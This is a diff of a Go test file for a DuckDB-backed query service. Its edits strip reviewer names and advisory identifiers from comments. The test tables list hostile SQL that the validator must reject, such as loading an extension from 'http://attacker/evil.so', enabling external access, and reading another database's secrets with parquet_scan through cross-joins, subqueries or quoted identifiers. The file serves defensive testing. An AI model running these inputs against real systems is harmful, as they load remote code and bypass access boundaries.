@@ -654,8 +654,7 @@ func TestConvertSQLToStoragePaths_FromKeywordFunctions(t *testing.T) {
 // works when EXTRACT appears AFTER the outer FROM/JOIN — the position where
 // the table-rewrite regex would shift every downstream byte and (if the
 // mask helper restored by absolute pre-rewrite offsets) would corrupt the
-// rewritten read_parquet call. This was a security finding flagged by the
-// post-implementation review.
+// rewritten read_parquet call.
 func TestConvertSQLToStoragePaths_ExtractAfterFrom(t *testing.T) {
 	h := &QueryHandler{
 		storage: &mockLocalBackend{basePath: "./data"},
@@ -941,15 +940,15 @@ func TestDangerousSQLPatterns(t *testing.T) {
 		{name: "PRAGMA settings change", sql: "PRAGMA enable_external_access=true", shouldFail: true},
 		{name: "SET GLOBAL var", sql: "SET GLOBAL extension_directory='/tmp/x'", shouldFail: true},
 		{name: "SET session var", sql: "SET enable_external_access=true", shouldFail: true},
-		// Bypasses caught by gemini round 1 — DuckDB SET accepts both = and TO,
-		// and supports SET VARIABLE x = 1; RESET also mutates session state.
+		// Bypasses: DuckDB SET accepts both = and TO, and supports SET
+		// VARIABLE x = 1; RESET also mutates session state.
 		{name: "SET TO syntax", sql: "SET enable_external_access TO true", shouldFail: true},
 		{name: "SET VARIABLE", sql: "SET VARIABLE x = 1", shouldFail: true},
 		{name: "RESET var", sql: "RESET enable_external_access", shouldFail: true},
 		{name: "LOAD extension", sql: "LOAD 'http://attacker/evil.so'", shouldFail: true},
 		{name: "INSTALL extension", sql: "INSTALL httpfs", shouldFail: true},
 		{name: "CALL procedure", sql: "CALL pragma_database_list()", shouldFail: true},
-		// Bypass caught by gemini r1 — CALL with no whitespace before paren.
+		// Bypass: CALL with no whitespace before paren.
 		{name: "CALL paren no space", sql: "CALL(pragma_database_list)", shouldFail: true},
 		// Case variations
 		{name: "drop table lowercase", sql: "drop table users", shouldFail: true},
@@ -976,7 +975,7 @@ func TestDangerousSQLPatterns(t *testing.T) {
 }
 
 // TestValidateHeaderDatabase covers the x-iedb-database header
-// validation gate added for C2 (review/query-path-criticals). The
+// validation gate. The
 // header value is interpolated into read_parquet('<base>/<db>/...')
 // paths; without validation an attacker breaks out of the literal.
 // Empty header is allowed (handlers fall back to default DB).
@@ -1027,7 +1026,7 @@ func TestValidateHeaderDatabase(t *testing.T) {
 // `read_parquet('PATH')` gets its single quotes doubled, regardless
 // of input shape. This is the single source of truth helper for path
 // quoting in the query layer; if a future call site bypasses it,
-// gemini will catch the regression in PR review.
+// the regression will be caught in PR review.
 func TestQuotePath(t *testing.T) {
 	tests := []struct {
 		in   string
@@ -1107,8 +1106,7 @@ func TestValidateSQLRequest_BypassesAndFalsePositives(t *testing.T) {
 		{name: "user iedb_partition_agg in CTE", sql: "WITH x AS (SELECT * FROM iedb_partition_agg('db2', 'mem', 'hour')) SELECT * FROM x", shouldFail: true},
 		{name: "literal containing iedb_partition_agg text", sql: "SELECT * FROM logs WHERE msg = 'iedb_partition_agg failed'", shouldFail: false},
 
-		// GHSA-93cm-2v4m-c56c (incomplete fix of CVE-2026-47735): the
-		// read_parquet denylist missed the parquet_scan alias and the rest
+		// The read_parquet denylist missed the parquet_scan alias and the rest
 		// of the DuckDB I/O table-function family. They read inside the
 		// sandbox's allowlisted storage root, crossing the RBAC boundary
 		// (e.g. a user scoped to db1 reads /data/iedb/db2/secrets via
@@ -1136,8 +1134,7 @@ func TestValidateSQLRequest_BypassesAndFalsePositives(t *testing.T) {
 		// function name, NOT anchored to FROM/JOIN): comma cross-joins,
 		// subqueries, IN-lists, and lateral joins all reach DuckDB's executor
 		// and must be blocked. A FROM/JOIN-anchored check missed all of these
-		// — comma-join in particular was a live bypass (GHSA-93cm-2v4m-c56c
-		// review finding).
+		// — comma-join in particular was a live bypass.
 		{name: "parquet_scan via comma cross-join", sql: "SELECT * FROM cpu, parquet_scan('/data/iedb/db2/secrets/x.parquet')", shouldFail: true},
 		{name: "read_parquet via comma cross-join", sql: "SELECT * FROM cpu, read_parquet('/data/iedb/db2/x.parquet')", shouldFail: true},
 		{name: "glob via comma cross-join", sql: "SELECT * FROM cpu a, glob('/data/iedb/**/*') g", shouldFail: true},
@@ -1147,7 +1144,7 @@ func TestValidateSQLRequest_BypassesAndFalsePositives(t *testing.T) {
 		{name: "parquet_scan in scalar subquery", sql: "SELECT (SELECT count(*) FROM parquet_scan('/data/iedb/db2/x.parquet')) AS n", shouldFail: true},
 		{name: "iedb_partition_agg via comma join", sql: "SELECT * FROM cpu, iedb_partition_agg('db2', 'mem', 'hour')", shouldFail: true},
 
-		// Quoted-identifier bypass (GHSA-93cm-2v4m-c56c review round 2): DuckDB
+		// Quoted-identifier bypass: DuckDB
 		// executes `"parquet_scan"(...)` and `` `read_parquet`(...) `` exactly
 		// like the unquoted call. The general normalisation masks quoted
 		// identifiers as string literals, so the denylist must run on a
@@ -1218,7 +1215,7 @@ func TestValidateSQLRequest_BypassesAndFalsePositives(t *testing.T) {
 // functions the denylist must reject in every position. If DuckDB adds a new
 // path-taking function (or IEDB loads an extension exposing one), add it both
 // here and to ioTableFunctionPattern. This test exists so the list is reviewed
-// deliberately rather than drifting silently — the original CVE-2026-47735 fix
+// deliberately rather than drifting silently — the original fix
 // was incomplete precisely because the list was not maintained against the
 // DuckDB function catalog.
 func TestIOTableFunctionPattern_Family(t *testing.T) {
